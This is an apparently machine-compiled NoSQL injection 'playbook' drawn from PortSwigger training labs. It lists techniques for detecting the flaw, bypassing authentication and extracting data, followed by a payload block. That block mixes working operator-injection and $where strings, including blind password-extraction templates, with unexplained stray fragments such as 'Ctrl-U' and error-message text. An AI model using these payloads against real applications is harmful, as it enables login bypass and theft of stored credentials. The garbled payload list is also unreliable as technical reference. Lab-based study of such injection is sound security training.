## NOSQL Playbook
*Synthesized from 4 PortSwigger labs*

### Overview
This playbook covers 4 known attack techniques for nosql.

### Attack Techniques

**Bypass Techniques:**
- Exploiting NoSQL operator injection to bypass authentication

**General:**
- Detecting NoSQL injection
- Exploiting NoSQL injection to extract data
- Exploiting NoSQL operator injection to extract unknown fields

### Key Payloads
```
"$where": "0" to "$where": "1"
{"$regex":"admin.*"},
"[TEST_PASS]"
administrator' && this.password.length < 30 || 'a'=='b
"$where":"Object.keys(this)[1].match('^.{}.*')"
"$where": "0"
"invalid"
user
{"$ne":"invalid"}
$regex
Gifts'+'
{"$regex":"wien.*"}
[TEST_USER]'+'
administrator' && this.password[§0§]=='§a§
Ctrl-U
[TEST_USER]' && '1'=='2
POST
                                    /login
Invalid username or password
"[TEST_USER]"
POST /login
```

### Indicators of Success
- Unexpected data in response
- Error messages revealing internal info
- Behavior change confirming injection
- Out-of-band callback received
- Access to unauthorized resources

### Testing Methodology
1. **Identify injection points** — forms, parameters, headers, cookies
2. **Test basic payloads** — start simple, escalate complexity
3. **Observe responses** — errors, timing, content changes
4. **Try bypasses** — encoding, alternative syntax, filter evasion
5. **Confirm impact** — data extraction, privilege escalation, RCE

